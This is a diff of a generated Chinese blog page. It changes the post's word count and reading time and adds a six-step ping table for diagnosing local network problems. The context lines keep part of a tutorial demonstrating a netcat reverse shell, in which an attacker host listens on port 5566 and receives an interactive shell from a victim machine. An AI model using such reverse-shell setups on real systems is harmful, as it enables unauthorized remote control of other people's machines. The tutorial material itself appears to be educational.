@@ -64,7 +64,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">1.8k字</span>
+            <span class="post-count">1.9k字</span>
         </span>
     </span>
 
@@ -73,7 +73,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">7分钟</span>
+            <span class="post-count">8分钟</span>
         </span>
     </span>
 </div>
@@ -177,6 +177,40 @@
 <p>攻击端：</p>
 <p>[root@hacker <del>]# nc -lvp 5566    //第一步<br>Ncat: Version 7.50 ( <a href="https://nmap.org/ncat" target="_blank" rel="noopener">https://nmap.org/ncat</a> )<br>Ncat: Listening on :::5566<br>Ncat: Listening on 0.0.0.0:5566<br>Ncat: Connection from 10.201.61.195.<br>Ncat: Connection from 10.201.61.195:51182.<br>[root@victim ~]# hostname    //第三步。测试4结果：攻击端已获得受害端的远程交互式shell，而且受害端没有再回显攻击端输入的命令</del><br>hostname<br>victim</p>
 <p>//PS：由测试3、测试4对比可见，标准错误2不仅显示错误信息的作用，居然还有回显输入命令和终端提示符的作用<del>~</del></p>
+<h2 id="排查本机网络问题："><a href="#排查本机网络问题：" class="headerlink" title="排查本机网络问题："></a><strong>排查本机网络问题：</strong></h2><table>
+<thead>
+<tr>
+<th><strong>1</strong></th>
+<th><strong>ping 127.0.0.1</strong></th>
+<th><strong>排查本机 TCP/IP 协议是否正常</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>2</strong></td>
+<td><strong>ping 本机IP</strong></td>
+<td><strong>排查网卡或网卡驱动是否正常</strong></td>
+</tr>
+<tr>
+<td><strong>3</strong></td>
+<td><strong>ping 同网段IP</strong></td>
+<td><strong>排查交换机端口工作模式、vlan划分</strong></td>
+</tr>
+<tr>
+<td><strong>4</strong></td>
+<td><strong>ping 通网段网关</strong></td>
+<td><strong>排查主机到本地网络是否正常</strong></td>
+</tr>
+<tr>
+<td><strong>5</strong></td>
+<td><strong>ping 公网IP</strong></td>
+<td><strong>排查路由是否正常</strong></td>
+</tr>
+<tr>
+<td><strong>6</strong></td>
+<td><strong>ping 公网某个域名</strong></td>
+<td><strong>排查DNS服务配置是否正常</strong></td>
+</tr>
+</tbody></table>
 
       
       <!-- reward -->
